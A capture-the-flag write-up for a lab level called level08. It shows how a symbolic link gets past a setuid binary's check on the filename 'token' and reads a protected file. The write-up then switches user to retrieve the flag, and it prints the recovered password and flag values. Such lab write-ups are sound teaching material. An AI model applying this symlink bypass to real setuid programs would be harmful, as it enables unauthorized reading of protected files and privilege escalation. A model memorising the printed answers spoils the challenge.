# Level08 Documentation

## Objective
Retrieve the token hidden in an inaccessible file named `token` by bypassing filename validation.

---

## Approach & Tools
- **Technique**: Symbolic link filename bypass
- **Commands**: `ln`, `su`, `getflag`,
---

## Step-by-Step Solution
once we log into level08 account we find a ```level08```nad ```token``` files
```bash
ls -la
```
#### output 
```bash
-rwsr-s---+ 1 flag08  level08 8617 Mar 5 2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

#### 1. Test Binary Behavior
The binary restricts access to files named "token":

```bash
./level08 token
```
#### Output:
```bash
You may not access 'token'
```
### 2. Bypass Filename Check
Create a symbolic link with a different name:
```bash
ln -s /home/user/level08/token /tmp/maflag
```
### 4. Read Through Symlink
```bash
./level08 /tmp/maflag
```
#### Output:
```bash
quif5eloekouj29ke0vouxean
```
### 5. Retrieve Level09 Token
```bash
su flag08
Password: quif5eloekouj29ke0vouxean
getflag
```
#### Output:
```bash
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
### Key Takeaways
* Symbolic Links Bypass Checks: Changing the apparent filename can bypass simple string checks

* Permission Inheritance: Symlinks maintain original file permissions

* Defensive Programming: Always verify file contents, not just names